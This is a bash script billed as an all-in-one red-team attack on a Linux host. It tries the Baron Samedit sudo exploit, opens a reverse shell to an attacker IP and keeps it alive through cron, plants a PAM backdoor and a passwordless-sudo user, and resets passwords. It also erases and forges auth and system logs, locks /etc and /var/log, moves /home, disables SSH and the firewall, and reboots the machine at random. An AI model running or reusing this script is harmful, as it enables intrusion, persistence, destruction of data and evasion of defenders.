#!/bin/bash

# All-in-One Red Team Script: Privilege Escalation, Cron Jobs, Backdoors, Random File Creation, Log Manipulation, User Changes, Service Manipulation

ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"
TARGET_USER="targetuser"
BACKDOOR_USER="backdoor"
BACKDOOR_PASS="backdoorpass"

LOG_FILE="/tmp/redteam.log"

# Log start of the attack
echo "[+] Red Team All-In-One Attack Started at $(date)" >> $LOG_FILE

# Step 1: Privilege Escalation
echo "[+] Attempting privilege escalation..." >> $LOG_FILE

# Attempt CVE-2021-3156 (Baron Samedit) exploit to gain root privileges
sudoedit -s '\' $(perl -e 'print "A" x 65536') 2>/dev/null || true

# Check if privilege escalation was successful
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Privilege escalation successful! Running as root." >> $LOG_FILE
else
    echo "[!] Privilege escalation failed. Continuing as $(whoami)." >> $LOG_FILE
fi

# Step 2: Create backdoors (reverse shells, cron jobs, PAM backdoor)
echo "[+] Creating multiple backdoors..." >> $LOG_FILE

# 2.1 Reverse shell backdoor
REVERSE_SHELL_CMD="bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
nohup bash -c "$REVERSE_SHELL_CMD" &>/dev/null &

# 2.2 Add a persistent cron job for reverse shell (runs every minute)
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1") | crontab -

# 2.3 PAM backdoor (hardcoded password for any user)
PAM_BACKDOOR="/usr/local/bin/pam_backdoor.sh"
cat << EOF > $PAM_BACKDOOR
#!/bin/bash
if [ "\$PAM_TYPE" == "auth" ]; then
    if [ "\$PAM_USER" != "root" ] && [ "\$PAM_AUTHTOK" == "$BACKDOOR_PASS" ]; then
        exit 0
    fi
fi
exit 1
EOF
chmod +x $PAM_BACKDOOR
echo "auth required pam_exec.so /usr/local/bin/pam_backdoor.sh" >> /etc/pam.d/sshd

# Step 3: Cron job flood
echo "[+] Setting up cron jobs for disruption..." >> $LOG_FILE

# 3.1 Flood with annoying cron jobs
add_cron_job() {
    JOB_CMD=$1
    INTERVAL=$2
    (crontab -l 2>/dev/null; echo "$INTERVAL $JOB_CMD") | crontab -
}

# Cron job to mess with /etc/hosts every 10 minutes
add_cron_job "echo '127.0.0.1 google.com' >> /etc/hosts" "*/10 * * * *"

# Cron job to fill up /tmp with random files every 5 minutes
add_cron_job "dd if=/dev/urandom of=/tmp/junk_\$(date +\%s).bin bs=1M count=10" "*/5 * * * *"

# Cron job to reset target user's password every 7 minutes
add_cron_job "echo '$TARGET_USER:newpassword' | chpasswd" "*/7 * * * *"

# Step 4: Create random folders and files to throw off the Blue Team
echo "[+] Creating tons of random files and folders..." >> $LOG_FILE

for i in {1..500}; do
    RAND_DIR="/tmp/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
    mkdir -p $RAND_DIR
    touch $RAND_DIR/file_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
    echo "Random data: $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 100)" >> $RAND_DIR/log.txt
done

# Step 5: Manipulate system logs (erase logs to hide traces)
echo "[+] Manipulating system logs to hide traces..." >> $LOG_FILE

# Clear log files
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/kern.log

# Add fake log entries to throw off defenders
echo "Oct  5 15:42:31 localhost systemd[1]: Started Session 2 of user targetuser." >> /var/log/syslog
echo "Oct  5 15:42:35 localhost sshd[2345]: Accepted password for root from 192.168.1.200 port 51123 ssh2" >> /var/log/auth.log

# Step 6: Add and reset users
echo "[+] Adding and resetting users..." >> $LOG_FILE

# Add a backdoor user with sudo privileges
useradd -m -p $(openssl passwd -1 $BACKDOOR_PASS) -s /bin/bash $BACKDOOR_USER
usermod -aG sudo $BACKDOOR_USER
echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Reset password of target user
echo "$TARGET_USER:changedpassword" | chpasswd

# Step 7: Mess with directories (rename, delete, hide critical directories)
echo "[+] Messing with critical system directories..." >> $LOG_FILE

# Rename /home directory to confuse users
mv /home /confused_home

# Hide system directories
chmod 000 /etc
chmod 000 /var/log

# Step 8: Mess with services (randomly stop critical services)
echo "[+] Randomly stopping services to cause chaos..." >> $LOG_FILE

# Stop SSH service randomly
systemctl stop ssh
systemctl disable ssh

# Stop firewall
ufw disable

# Step 9: Reboot the system randomly to disrupt defenders
echo "[+] Rebooting system randomly..." >> $LOG_FILE
if (( RANDOM % 2 )); then
    reboot
fi

# Final log message
echo "[+] Red Team All-In-One Attack Completed at $(date)" >> $LOG_FILE